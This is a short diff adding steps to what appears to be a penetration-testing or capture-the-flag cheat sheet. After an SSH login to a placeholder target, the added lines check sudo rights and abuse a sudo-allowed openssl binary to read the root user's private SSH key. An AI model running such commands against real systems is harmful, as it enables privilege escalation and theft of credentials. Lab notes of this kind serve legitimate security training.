@@ -149,6 +149,19 @@ run
   ssh <USERNAME>@<TARGET_IP>
 
   #Logged in?
+
+  sudo -l
+
+  #Example result:
+  /usr/bin/openssl
+  #Make a Variable
+  LFILE=/root/.ssh/id_rsa
+  openssl enc -in "$LFILE"
+  #Designate the Variable Destination in this instance
+  LFILE=/root/.ssh/id_rsa
+  #Run the Command
+  sudo /usr/bin/openssl enc -in $LFILE
+
   
   #Upgrade Shell for ease of use
   /bin/bash
